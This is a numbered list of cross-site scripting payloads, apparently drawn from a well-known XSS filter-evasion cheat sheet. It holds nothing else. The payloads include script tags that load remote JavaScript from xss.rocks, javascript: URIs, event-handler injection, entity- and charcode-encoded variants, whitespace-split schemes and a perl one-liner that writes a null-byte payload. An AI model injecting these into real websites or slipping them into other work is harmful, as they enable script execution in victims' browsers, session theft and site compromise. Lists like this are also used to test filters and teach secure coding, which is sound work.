1.<SCRIPT SRC=http://xss.rocks/xss.js></SCRIPT>
2.javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/"/+/onmouseover=1/+/[*/[]/+alert(1)//'>
3.<IMG SRC="javascript:alert('XSS');">
4.<IMG SRC=javascript:alert('XSS')>
5.<IMG SRC=javascript:alert(&quot;XSS&quot;)>
6.<IMG SRC=`javascript:alert("RSnake says, 'XSS'")`>
7.<IMG """><SCRIPT>alert("XSS")</SCRIPT>">
8.<IMG SRC=# onmouseover="alert('xxs')">
9.<IMG onmouseover="alert('xxs')">
10.<IMG SRC=/ onerror="alert(String.fromCharCode(88,83,83))"></img>
11.<img src=x onerror="&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041">
12.<IMG SRC=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;
&#39;&#88;&#83;&#83;&#39;&#41;>
13.<IMG SRC=&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29>
14.<IMG SRC="jav	ascript:alert('XSS');">
15.<IMG SRC="jav&#x0A;ascript:alert('XSS');">
16.perl -e 'print "<IMG SRC=java\0script:alert(\"XSS\")>";' > out
17.<SCRIPT/XSS SRC="http://xss.rocks/xss.js"></SCRIPT>
18.<BODY onload!#$%&()*~+-_.,:;?@[/|\]^`=alert("XSS")>
19.<SCRIPT/SRC="http://xss.rocks/xss.js"></SCRIPT>
